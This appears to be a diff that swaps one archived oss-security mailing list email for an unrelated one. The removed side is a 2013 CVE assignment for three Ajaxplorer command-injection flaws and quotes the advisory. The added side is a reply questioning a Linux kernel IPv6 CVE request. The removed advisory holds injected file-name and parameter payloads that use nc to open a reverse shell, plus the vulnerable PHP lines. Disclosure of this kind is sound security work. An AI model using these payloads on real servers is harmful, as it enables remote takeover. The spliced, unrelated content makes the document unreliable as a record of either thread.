@@ -1,147 +1,37 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/08/21/16
-Message-ID: <52152241.9070102@redhat.com>
-Date: Wed, 21 Aug 2013 14:25:37 -0600
-From: Kurt Seifried <kseifried@...hat.com>
-To: oss-security@...ts.openwall.com
-CC: "Mehrenberger, Xavier" <Xavier.Mehrenberger@...sidian.com>
-Subject: Re: CVE requests for Ajaxplorer
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/07/23/8
+Message-ID: <20130723194954.GC19764@hunt>
+Date: Tue, 23 Jul 2013 12:49:54 -0700
+From: Seth Arnold <seth.arnold@...onical.com>
+To: P J P <ppandit@...hat.com>
+Cc: oss security list <oss-security@...ts.openwall.com>
+Subject: Re: CVE request: Linux kernel: panic while appending data to a corked IPv6 socket in ip6_append_data_mtu
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+On Wed, Jul 24, 2013 at 01:06:38AM +0530, P J P wrote:
+>   Hi,
+> 
+> Linux kernel built with the IPv6 networking support is vulnerable to a crash
+> while appending data to an IPv6 socket with UDP_CORKED option set. UDP_CORK
 
-On 07/04/2013 02:40 AM, Mehrenberger, Xavier wrote:
-> Hello,
-> 
-> I'd like to request CVE identifiers for three remote shell
-> execution vulnerabilities I have discovered in ajaxplorer. These
-> vulnerabilities are public, and have been fixed by upstream (see 
-> advisory below).
-> 
-> Kurt, this is the same advisory I sent you privately, describing
-> the same vulnerabilities. No identifiers have been issued yet.
-> 
-> Thanks
+UDP_CORKED? I don't see this string in my /usr/include/ or recent Linux
+git tree.
 
-top posting:
+Am I missing something?
 
-CVE-2013-4267 Ajaxeplorer "Power FS" action.powerfs
-CVE-2013-4268 Ajaxeplorer "File System (Standard)" access.fs
-CVE-2013-4269 Ajaxeplorer "Subversion Repository" meta.svn
+Thanks
 
+> enables accumulating data and sending it as single datagram.
+> 
+> An unprivileged user/program could use this flaw to crash the
+> kernel, resulting in local DoS.
+> 
+> Upstream fix:
+> -------------
+>  -> https://git.kernel.org/linus/75a493e60ac4bbe2e977e7129d6d8cbb0dd236be
+> 
+> Reference:
+> ----------
+>  -> https://bugzilla.redhat.com/show_bug.cgi?id=987633
 
-> ======================================= Advisory title: Several
-> ajaxplorer 5.0.0 remote exec vulnerabilities Product: Ajaxplorer
-> 5.0.0 plugins Credit: Xavier Mehrenberger, Cassidian CyberSecurity 
-> Upstream URL: http://ajaxplorer.info/ Vulnerable version: 5.0.0
-> plugins and probably earlier versions Tested: v5.0.0, June 2013 
-> Fixed in: v5.0.1, released 2013-06-29 Public fixes: 
-> https://github.com/ajaxplorer/ajaxplorer-core/commit/22a62840e5ac14bb389
->
-> 
-e7f24218ef6fb20963571
-> Category: Remote Code Execution Vulnerability type: [CWE-88]
-> Argument Injection or Modification CVE IDs: None yet Affected
-> plugins: * "Power FS" action.powerfs * "File System (Standard)"
-> access.fs * "Subversion Repository" meta.svn By: Xavier
-> Mehrenberger Cassidian CyberSecurity 
-> http://www.cassidiancybersecurity.com 
-> =======================================
-> 
-> ----- 1st vulnerability Affected plugin: "Power FS" action.powerfs 
-> Plugin URL: http://ajaxplorer.info/plugins/action/powerfs/ Plugin
-> description: delegate various time/memory-consuming actions to the 
-> underlying filesystem. Required configuration: Power FS plugin is
-> enabled. This can be done from the web interface by any user with
-> sufficient privileges. User has to be logged in to ajaxplorer.
-> 
-> Steps to reproduce: * Select one or more files * Click
-> More>Compress... * Use 'a";nc 127.0.0.1 1234 -e /bin/bash;"b' as
-> file name to execute a command on the server. This example command
-> provides you with a reverse shell on localhost:1234 (ajaxplorer
-> installed on localhost for test purposes)
-> 
-> Vulnerable code sample: --- file
-> plugins/action.powerfs/class.PowerFSController.php line 156 144
-> $archiveName = $httpVars["archive_name"]; ... 149 $cmd = "zip -r
-> \"".$archiveName."\" ".implode(" ", $args); ... 156 $proc =
-> popen($cmd, "r"); --- The $archiveName variable is controlled by
-> the attacker, and is not escaped before passing it to popen(). 
-> Proposed fix: properly sanitize user-controlled parameters.
-> 
-> 
-> ----- 2nd vulnerability Affected plugin: "File System (Standard)"
-> access.fs Plugin URL: http://ajaxplorer.info/plugins/access/fs/ 
-> Plugin description: Access to the local filesystem Required
-> configuration: "Real Size Probing" is set to "Yes" in File System 
-> plugin configuration. This option is set to "No" by default in
-> v5.0.0, but can be set from the web interface by any user with
-> sufficient privileges. User has to be logged in to ajaxplorer.
-> 
-> Steps to reproduce: * Create a new empty file * Set its name as
-> '$(nc 127.0.0.1 1234 -e bash)' (remove single quotes). This example
-> command provides you with a reverse shell on localhost:1234 
-> (ajaxplorer installed on localhost for test purposes)
-> 
-> Vulnerable code sample: --- file
-> plugins/access.fs/class.fsAccessWrapper.php, lines 443, 448, 455 
-> 440 protected function getTrueSizeOnFileSystem($file) { 442 $cmd =
-> "stat -L -c%s \"".$file."\""; 443 $val = trim(`$cmd`); 447 $cmd =
-> "ls -1s --block-size=1 \"".$file."\""; 448 $val = trim(`$cmd`); 453
-> $cmd = "ls -l \"".$file."\""; 455 $arr = explode("/[\s]+/",
-> `$cmd`); --- Line 469 is probably affected as well - executed on
-> Windows machines, not tested. The $file value is controlled by the
-> attacker, and is not escaped before passing it to backticks '`'. 
-> Proposed fix: properly sanitize user-controlled parameters.
-> 
-> 
-> ----- 3rd vulnerability Affected plugin: "Subversion Repository"
-> meta.svn Plugin URL: http://ajaxplorer.info/plugins/meta/svn/ 
-> Plugin description: Use an SVN working copy as an ajaxplorer
-> repository Required configuration: The SVN plugin has to be
-> enabled, and an ajaxplorer "SVN repository" has to be present. This
-> can be done from the web interface by any user with sufficient
-> privileges. User has to be logged in to ajaxplorer.
-> 
-> Steps to reproduce: * Send a forged revert_file request (ex. using
-> burp or webscarab) Such revert_file request get send when a user
-> tries to revert a file from an SVN working directory. * Set the
-> 'revision' parameter to '1; nc 127.0.0.1 1234 -e /bin/bash; echo' 
-> (remove single quotes). This example command provides you with a
-> reverse shell on localhost:1234 (ajaxplorer installed on localhost
-> for test purposes)
-> 
-> Vulnerable code sample: --- file
-> plugins/meta.svn/class.SvnManager.php, lines 203 and 205 196
-> $revision = $httpVars["revision"]; ... 203 system(
-> (SVNLIB_PATH!=""?SVNLIB_PATH."/":"") ."svn cat -r$revision 
-> $escapedFile > ".escapeshellarg($targetFile)); 204 }else{ 205
-> system( (SVNLIB_PATH!=""?SVNLIB_PATH."/":"") ."svn cat -r$revision 
-> $escapedFile > $escapedFile"); --- The $revision variable is
-> controlled by the attacker, and is not escaped properly. Proposed
-> fix: properly sanitize user-controlled parameters.
-> 
-> 
-> 
-
-- -- 
-Kurt Seifried Red Hat Security Response Team (SRT)
-PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.14 (GNU/Linux)
-
-iQIcBAEBAgAGBQJSFSJAAAoJEBYNRVNeJnmTdaEP/RZa5OQ8KZA/9MQ4g/42XS69
-X+HyYBD0LgYTkU97Z+YGPIBweTULhItffGyQbv+46RNjMq7qz2Gvobi5TimkkUU2
-q2jJALerndCo90kUSYjd0pgZzOcH5GXO6IjU/9JE/D6nIz8HGscOMlh9Hn9poBOP
-alwRSyOXbPcyQm+JbCEGkiHYTz3OWDaiOCagbNbngGbbPB/2Q/JUDqSclBd6DRCR
-2chs+f0WY5UxvCd8f3uByw4S4OtolQBvkQ3AbzmsQIQBJGHVOWw/RT5ZwoiZD84D
-jaD9r8ursM9GtKnK9Lex6WG3L5aebzrLYk9LTisg17pM9fZ4p2VzmMOvW1/bUxn4
-CzbNoffxhDkz6df0zw0BgskJ+qKYPIPFGJ0VTr4bgrfhxV4JstQCLHe+m/vfnKm4
-zFQs6QrvxoFRCfrHhEj709oqImky1q37rUVm+WupDILK+f1E6xB/0zkoC9LkfX+g
-xEmPsbxrIjhyspFVfCzmsAfUjVfQ5mcCr0BeOSiUqSjnpyhVWCwBVmirAjgpxjPZ
-/O5dbUrOQQJ5dAPqu7nVfKL9lmdQVYQ2BeXKjMIliHj4RrmU04kjgumK1SnyIqyA
-MZT0qbY8PJwDLWZzOH9a4Tm+6s4M2Bxwr98/fv4Osq6PAz8EL6KzfakaeafYc7ir
-HqoqCcLnE3+brbehPpB+
-=U6z1
------END PGP SIGNATURE-----
+Download attachment "signature.asc" of type "application/pgp-signature" (491 bytes)
